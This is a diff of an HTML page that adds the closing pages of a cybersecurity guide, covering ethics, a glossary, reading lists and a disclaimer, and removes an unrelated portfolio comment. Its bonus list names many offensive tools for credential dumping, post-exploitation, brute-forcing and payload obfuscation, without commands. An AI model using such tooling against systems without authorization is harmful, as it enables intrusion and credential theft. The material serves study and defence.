+────────────────────────────── PAGE 39/49 ──────────────────────────────
+CASE STUDIES
+
+• Data breaches
+• Ransomware
+• Government infra attacks
+• Insider threats
+────────────────────────────── PAGE 40/49 ──────────────────────────────
+PROJECTS & COMMUNITY
+
+• Start open-source projects
+• Document findings
+• Collaborate, write whitepapers
+────────────────────────────── PAGE 41/49 ──────────────────────────────
+ETHICS & LEGAL ISSUES
+
+• Always act ethically and legally
+• Respect rules of engagement
+• Understand local law, responsible disclosure
+────────────────────────────── PAGE 42/49 ──────────────────────────────
+CONTINUOUS IMPROVEMENT
+
+• Stay up to date with research
+• Integrate automation
+• Prepare for quantum and new tech
+────────────────────────────── PAGE 43/49 ──────────────────────────────
+APPENDIX: GLOSSARY
+
+• Malware: Malicious software
+• DDoS: Distributed Denial-of-Service
+• Phishing: Fraudulent data collection
+• IDS/IPS: Intrusion Detection/Prevention Systems
+────────────────────────────── PAGE 44/49 ──────────────────────────────
+APPENDIX: FURTHER READING
+
+Books:
+– Hacking: The Art of Exploitation
+– The Web Application Hacker’s Handbook
+– Practical Malware Analysis
+
+Websites:
+– KrebsOnSecurity
+– The Hacker News
+– r/netsec, r/hacking
+– Hack The Box, TryHackMe, VulnHub
+────────────────────────────── PAGE 45/49 ──────────────────────────────
+APPENDIX: DOC TEMPLATES
+
+Include templates for:
+• Incident response
+• Penetration test reports
+• Vulnerability assessments
+────────────────────────────── PAGE 46/49 ──────────────────────────────
+APPENDIX: DISCLAIMER
+
+• Educational and research use only
+• Do not attack systems you do not own or have explicit permission to test
+• Unauthorized use may result in criminal charges
+────────────────────────────── PAGE 47/49 ──────────────────────────────
+CONCLUSION
+
+Cybersecurity is a journey of continuous learning, application, and ethical practice. Every technique learned should be used to protect and improve defenses.
+────────────────────────────── PAGE 48/49 ──────────────────────────────
+NEXT STEPS
+
+• Review chapters
+• Try practical exercises
+• Participate in challenges
+• Build and document safer systems
+
+────────────────────────────── PAGE 49/49 ──────────────────────────────
+FINAL WORDS & NEXT STEPS
+
+Review each chapter in detail and try out the practical exercises in your secure lab environment.
+Participate in cybersecurity challenges and community discussions to refine your skills.
+Keep experimenting with new tools and document your research meticulously.
+Most importantly, leverage your new knowledge to build safer, resilient systems—one ethical test at a time.
+Thank you for reading this Comprehensive Cybersecurity Guide. May it serve as both a reference and an inspiration as you continue your journey to becoming an expert in protecting our digital world.
+
+────────────────────────────── END OF GUIDE ──────────────────────────────
+BONUS: ADVANCED & MODERN TOOLS
+</pre>
+<ul class="tool-list">
+<li>Burp Suite: Web app scanner</li>
+<li>Ghidra: Reverse engineering</li>
+<li>OpenVAS: Vulnerability scanning</li>
+<li>Lynis: Security auditing</li>
+<li>CyberChef: Data manipulation</li>
+<li>Hashcat: Password cracking</li>
+<li>KAPE: Forensic triage</li>
+<li>Suricata: IDS/IPS/NSM</li>
+<li>Zeek (Bro): Network analysis</li>
+<li>Cuckoo Sandbox: Malware analysis</li>
+<li>TheHive: Incident response</li>
+<li>MISP: Threat intel platform</li>
+<li>Velociraptor: Endpoint DFIR</li>
+<li>Sigma: SIEM signatures</li>
+<li>Yeti: Threat intel tracker</li>
+<li>RITA: Beaconing detection</li>
+<li>Maltrail: Malicious traffic detection</li>
+<li>Arkime: Packet capture/search</li>
+<li>Volatility: Memory forensics</li>
+<li>Fibratus: Windows kernel tracing</li>
+<li>BloodHound: AD path mapping</li>
+<li>CrackMapExec: Pentest toolkit</li>
+<li>Empire: Post-exploitation</li>
+<li>Osquery: OS instrumentation</li>
+<li>Sysmon: Windows monitoring</li>
+<li>Loki: IOC/threat scanner</li>
+<li>CrowdSec: Collaborative IPS</li>
+<li>ModSecurity: Web app firewall</li>
+<li>Falco: Cloud runtime security</li>
+<li>TShark: Packet analysis</li>
+<li>Packetbeat: Network analyzer</li>
+<li>Fakenet-NG: Malware network analysis</li>
+<li>Nmap: Network scanner</li>
+<li>Amass: Attack surface mapping</li>
+<li>Shodan: Device search</li>
+<li>Maltego: OSINT/link analysis</li>
+<li>SpiderFoot: Automated OSINT</li>
+<li>Recon-ng: Recon framework</li>
+<li>Faraday: Pentest management</li>
+<li>ZAP: Web scanner</li>
+<li>Snyk: Dependency scanning</li>
+<li>Trivy: Container scanning</li>
+<li>gitleaks: Secrets scanning</li>
+<li>Nessus: Vulnerability scanning</li>
+<li>Rapid7 InsightVM: Vulnerability mgmt</li>
+<li>Metasploit: Exploits/dev</li>
+<li>Cobalt Strike: Red teaming</li>
+<li>John the Ripper: Passwords</li>
+<li>Hydra: Login brute-force</li>
+<li>Medusa: Fast brute-force</li>
+<li>SQLmap: SQL injection</li>
+<li>Nikto: Web server scan</li>
+<li>Dirb/Gobuster: Dir brute-forcing</li>
+<li>SecLists: Testing lists</li>
+<li>SSLyze: SSL/TLS scan</li>
+<li>Testssl.sh: SSL testing</li>
+<li>Frost: File forensics</li>
+<li>RedHunt OS: Adversary emulation</li>
+<li>BlackArch: Hacking distro</li>
+<li>Kali Linux: Pen-test distro</li>
+<li>Parrot Security: Security OS</li>
+<li>REMnux: Malware analysis distro</li>
+<li>OSCP Labs: OffSec practice</li>
+<li>Blue Team Labs Online</li>
+<li>TryHackMe: Labs/platform</li>
+<li>Hack The Box: Labs/platform</li>
+<li>VulnHub: Practice VMs</li>
+<li>Proxmark3: RFID/NFC security</li>
+<li>USB Rubber Ducky: HID attacks</li>
+<li>Pwnagotchi: WiFi handshakes</li>
+<li>Responder: LLMNR/NBTNS spoof</li>
+<li>Impacket: Protocol toolkit</li>
+<li>Mimikatz: Credential dumping</li>
+<li>Kerbrute: Kerberos attacks</li>
+<li>PetitPotam: NTLM relay</li>
+<li>SharpHound: AD recon</li>
+<li>Certify: ADCS abuse</li>
+<li>WinPEAS/LinPEAS: Priv esc scripts</li>
+<li>Watson: Priv esc automation</li>
+<li>Seatbelt: Windows info gathering</li>
+<li>PowerView: AD reconnaissance</li>
+<li>PowerUp: Priv esc</li>
+<li>PowerSploit: Post-exploitation</li>
+<li>BloodHound: Path finding</li>
+<li>SharpShooter: Payload creation</li>
+<li>Invoke-Obfuscation: Script obfuscation</li>
+<li>Invoke-PSImage: Script in image</li>
+<li>SCF: Security configuration framework</li>
+<li>Atomic Red Team: Attack simulation</li>
+<li>Caldera: Automated red teaming</li>
+<li>PurpleSharp: Attack simulation</li>
+<li>Sysinternals Suite</li>
+</ul>
+<div class="warning">
+This guide is free to improvements, contact creator @krazedtf_out on discord.
+</div>
+  </div>
+  <div class="footer">
+    © krazedout 2025 (huntslut, hxdea)
+  </div>
 </body>
 </html>
-
-<!--
-CUSTOMIZATION GUIDE
-===================
-
-To customize this portfolio for your own use:
-
-1. NAME & BRANDING:
-   - Line 22: Update page title
-   - Line 48: Change nav logo initials (AR)
-   - Line 76: Change avatar placeholder initials
-   - Line 77: Update your name
-   - Line 285: Update footer text
-
-2. TAGLINE:
-   - scripts.js line 3: Edit the typing text array with your own taglines
-
-3. PROFILE PHOTO:
-   - Replace .avatar-placeholder (line 76) with an <img> tag
-   - Example: <img src="your-photo.jpg" alt="Your Name" class="hero__avatar-img">
-   - Add CSS: .hero__avatar-img { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; }
-
-4. ACCENT COLORS:
-   - styles.css lines 2-8: Edit CSS variables
-   - --primary-color: Main brand color (buttons, links)
-   - --primary-light: Lighter shade for hover states
-   - --accent-color: Secondary accent color
-
-5. SOCIAL LINKS:
-   - Lines 81-105: Update href attributes with your URLs
-
-6. CONTENT:
-   - About section (lines 115-133): Edit bio and skills
-   - Projects (lines 138-259): Update project details, descriptions, tags, and links
-   - Contact email (line 278): Update email address
-
-7. META TAGS & SEO:
-   - Lines 6-17: Update description and Open Graph tags
-   - Line 21: Update og:url with your domain
--->
